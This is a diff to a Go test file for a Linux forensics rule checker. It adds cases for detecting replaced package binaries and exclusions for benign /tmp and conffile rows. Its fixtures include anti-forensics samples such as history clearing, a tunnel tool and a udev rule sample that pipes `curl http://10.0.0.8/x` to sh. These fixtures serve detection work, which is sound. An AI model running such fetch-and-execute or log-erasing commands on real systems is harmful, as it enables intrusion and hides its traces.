@@ -66,7 +66,7 @@ func TestLinuxCheckRules(t *testing.T) {
 		{"ld-preload", `/tmp/.preload.so`, "preload-entry"},
 		{"shell-rc", `HISTFILE=/dev/null`, "history-off"},
 		{"history", `history -c`, "history-clear"},
-		{"tmp-listing", `-rw-r--r-- 1 root root 4096 Jun  1 10:00 .backdoor`, "tmp-hidden-entry"},
+		{"tmp-listing", `-rw-r--r-- 1 root root 4096 Jun  1 10:00 /tmp/.backdoor`, "hidden-tmp-path"},
 		{"key-dirs", `-rw------- 1 root root 1679 Jun  1 10:00 /root/.ssh/authorized_keys`, "ssh-material"},
 		{"key-dirs", `drwxr-xr-x 1 root root 4096 Jun  1 10:00 /opt/chisel`, "tunnel-tool"},
 		{"suid", `/home/deploy/find`, "suid-gtfobins"},
@@ -78,6 +78,15 @@ func TestLinuxCheckRules(t *testing.T) {
 		{"caps", `/usr/bin/x cap_setuid=ep`, "caps-setuid"},
 		{"pkg-verify", `??5?????? c /etc/hosts`, "pkg-checksum"},
 		{"pkg-verify", `/usr/sbin/sshd: ASCII text`, "bin-not-elf"},
+		// the forensics sections list the files the verifier flagged: an ELF row
+		// and an executable row are the replaced-binary case, in either channel's
+		// row shape (the local tier's single spaces, GNU ls's padding)
+		{"pkg-verify", `/bin/ls: ELF 64-bit LSB executable`, "pkg-changed-elf"},
+		{"pkg-verify", `/usr/lib/x/libevil.so: ELF 64-bit LSB shared object`, "pkg-changed-elf"},
+		{"pkg-verify", `-rwxr-xr-x 1 root root 8600 May 18 07:20 /bin/ls`, "pkg-changed-exec"},
+		{"pkg-verify", `-rwxr-xr-x  1 root root  8600 May 18 07:20 /bin/ls`, "pkg-changed-exec"},
+		{"pkg-verify", `-rw-rwxr-- 1 root root 8600 May 18 07:20 /usr/lib/x/helper`, "pkg-changed-exec"},
+		{"pkg-verify", `-rw-rw-rwx 1 root root 8600 May 18 07:20 /usr/lib/x/helper`, "pkg-changed-exec"},
 		{"pkg-history", `2025-06-01 10:20 install nginx:amd64 <none> 1.18.0`, "pkg-changed"},
 		{"pkg-history", `Commandline: apt-get install -y nginx`, "pkg-apt-record"},
 		{"modules-load", `evil_module`, "modules-boot-entry"},
@@ -116,6 +125,17 @@ func TestLinuxRuleExclusions(t *testing.T) {
 		{"suid", `/usr/libexec/y`, "suid-outside-system"},
 		{"suid", `/usr/local/bin/z`, "suid-outside-system"},
 		{"sgid", `/usr/lib/x86_64-linux-gnu/utempter/utempter`, "sgid-outside-system"},
+		// the temp listing's hidden-entry rule is the global one, so its standard
+		// system entries stay quiet here too
+		{"tmp-listing", `drwxrwxrwt 2 root root 4096 Jun  1 10:00 /tmp/.X11-unix`, "hidden-tmp-path"},
+		{"tmp-listing", `-rw-r--r-- 1 root root 4096 Jun  1 10:00 /tmp/.pwd.lock`, "hidden-tmp-path"},
+		// a changed conffile is the administrator's edit: the binary rules leave
+		// its rows and the text-type rows alone
+		{"pkg-verify", `-rw-r--r-- 1 root root 358 May 16 15:05 /etc/default/syslog-ng`, "pkg-changed-exec"},
+		{"pkg-verify", `-rw-r--r-- 1 root root 358 May 16 15:05 /etc/default/syslog-ng`, "pkg-changed-elf"},
+		{"pkg-verify", `/etc/logrotate.conf: ASCII text`, "pkg-changed-elf"},
+		// a directory row carries execute bits but is not a program
+		{"pkg-verify", `drwxr-xr-x 2 root root 4096 May 16 15:05 /usr/share/x`, "pkg-changed-exec"},
 	}
 	for _, tc := range cases {
 		check := testkit.CheckByID(t, All, tc.check)
@@ -170,6 +190,11 @@ func TestLinuxRuleSpansCoverTheToken(t *testing.T) {
 		{"cwd-tmp", `/proc/1234 -> /tmp/evil/x.sh`, "proc-cwd-tmp", "/proc/1234 -> /tmp/evil/x.sh"},
 		{"udev-rules", `RUN+="/bin/sh -c 'curl http://10.0.0.8/x|sh'"`, "udev-exec-key",
 			`RUN+="/bin/sh -c 'curl http://10.0.0.8/x|sh'"`},
+		// a changed binary is the whole record, not one field of it
+		{"pkg-verify", `-rwxr-xr-x 1 root root 8600 May 18 07:20 /bin/ls`, "pkg-changed-exec",
+			`-rwxr-xr-x 1 root root 8600 May 18 07:20 /bin/ls`},
+		{"pkg-verify", `/bin/ls: ELF 64-bit LSB executable`, "pkg-changed-elf",
+			`/bin/ls: ELF 64-bit LSB executable`},
 	}
 	for _, tc := range cases {
 		check := testkit.CheckByID(t, All, tc.check)
